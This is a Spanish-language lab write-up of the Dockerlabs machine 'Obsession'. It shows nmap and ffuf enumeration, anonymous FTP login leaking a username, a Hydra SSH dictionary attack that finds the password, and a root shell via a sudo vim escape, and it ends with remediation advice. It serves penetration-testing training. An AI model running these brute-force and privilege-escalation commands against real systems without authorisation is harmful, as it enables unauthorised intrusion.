---
title: Dockerlabs - Obsession
date: 2026-11-01
platform: Dockerlabs
difficulty: Very Easy
os: Linux
tags:
  - FTP
  - Anonymous
  - Hydra
  - SSH
  - Sudo
  - Vim
  - InformationDisclosure
status: Completada
---

# Resumen Ejecutivo

**IP Objetivo:** `172.17.0.2`
**Descripción breve:** Máquina Linux muy fácil con acceso anónimo por FTP que filtra un nombre de usuario válido. Se consigue la contraseña por fuerza bruta con [[Hydra]] contra [[SSH]] y se escala a `root` abusando de `sudo vim`.

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos con [[Nmap]]

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.2 -n -Pn -oG escaneo
```

Una vez conocidos los puertos, se lanzan los scripts de detección de versión:

```bash
sudo nmap -p21,22,80 -sCV 172.17.0.2 -oN servicios
```

**Puertos Abiertos:**
- 21 ([[FTP - SFTP|FTP]]), 22 ([[SSH]]), 80 (HTTP)

### Enumeración de Servicios / Fuzzing

Acceso anónimo al [[FTP - SFTP|FTP]]:

```bash
ftp 172.17.0.2
# usuario: anonymous
# contraseña: (Enter)
```

Enumeración de directorios web con [[FFUF]] (también valdría `gobuster`):

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ -mc 200,301,302
```

**Descubrimientos clave:**
- El servidor [[FTP - SFTP|FTP]] permite **login anónimo**.
- Dentro del FTP hay un archivo que revela que el usuario del sistema es `russoski`.
- En la web existen los directorios `/backups` y `/information`.

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)

- **FTP anónimo habilitado:** cualquiera puede leer los archivos del servicio y enumerar información interna sin credenciales.
- **Divulgación de información:** el FTP y los directorios `/backups` y `/information` exponen nombres de usuario y posibles respaldos.
- **[[SSH]] con autenticación por contraseña:** al tener un usuario válido, es posible un ataque de diccionario con [[Hydra]].

---

## 3. Exploitation (Acceso Inicial)

### Metodología

1. Conectarse al [[FTP - SFTP|FTP]] como `anonymous`.
2. Leer los archivos disponibles y extraer el nombre de usuario `russoski`.
3. Lanzar un ataque de diccionario contra [[SSH]] con [[Hydra]].
4. Validar la contraseña obtenida y conectarse por [[SSH]].

### Ejecución

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -f
```

La contraseña encontrada es `iloveu`, así que se entra por [[SSH]]:

```bash
ssh russoski@172.17.0.2
```

---

## 4. Privilege Escalation ([[Escaladas de privilegios]])

### Enumeración Interna

Se revisan los permisos de `sudo` del usuario (ver [[Escaladas de privilegios#sudo -l|sudo -l]]):

```bash
sudo -l
```

Resultado relevante:

```text
(root) NOPASSWD: /usr/bin/vim
```

### Explotación Local

`vim` se puede ejecutar como `root` sin contraseña, y permite lanzar una shell desde dentro del editor (técnica habitual de GTFObins).

1. Abrir `vim` con privilegios de `root`.
2. Ejecutar una shell desde el propio editor.

### Ejecución

```bash
sudo vim -c ':!/bin/bash'
```

Alternativa dentro de `vim`:

```text
:!/bin/bash
```

**Prueba de acceso (Root/SYSTEM Flag):**

```bash
whoami
# root
```

---

## 5. Lecciones Aprendidas

- Nunca dejar **FTP anónimo** con archivos internos: filtra usuarios y datos de negocio.
- Una contraseña débil (`iloveu`) cae con un diccionario común (ver [[Hydra]]).
- No delegar `sudo` sobre editores como `vim` sin restricciones: permiten escapar a una shell como `root` (ver [[Escaladas de privilegios]]).

## Remediation (Mitigaciones)

- **Acceso inicial:** deshabilitar el login anónimo en [[FTP - SFTP|FTP]], aplicar política de contraseñas robusta y limitar los intentos por [[SSH]] (fail2ban).
- **Escalada:** eliminar la regla `NOPASSWD` sobre `/usr/bin/vim` y usar un script de sudoers con comandos acotados.

---

## Ver también

- [[Hydra]] - Ataque de diccionario usado contra SSH.
- [[Nmap]] - Enumeración de puertos y versiones.
- [[SSH]] - Protocolo de acceso inicial.
- [[FTP - SFTP]] - Servicio anónimo que filtra el usuario.
- [[Escaladas de privilegios]] - Técnicas de elevación de privilegios.
